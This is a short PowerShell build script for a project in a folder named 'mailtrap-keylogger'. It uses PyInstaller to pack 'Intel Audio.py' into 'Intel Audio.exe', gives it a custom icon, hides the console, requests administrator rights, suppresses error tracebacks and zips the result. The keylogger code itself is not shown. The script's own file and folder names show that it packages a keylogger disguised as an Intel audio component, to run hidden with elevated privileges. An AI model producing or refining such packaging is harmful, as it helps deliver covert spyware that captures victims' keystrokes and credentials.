$ProjectPath = "$env:USERPROFILE\hack\mailtrap-keylogger"
$venvScript  = "$ProjectPath\env\bin\activate.ps1"
$DistPath    = "$ProjectPath\dist"
$DistFile    = "$DistPath\Intel Audio.exe"
$DistZip     = "$DistPath\Intel Audio.zip"


powershell  $venvScript
pyinstaller --clean --onefile --nowindowed --noconsole --hide-console hide-early -i .\icon.ico --uac-admin --disable-windowed-traceback --bootloader-ignore-signals '.\Intel Audio.py'
Compress-Archive -Path $DistFile -DestinationPath $DistZip
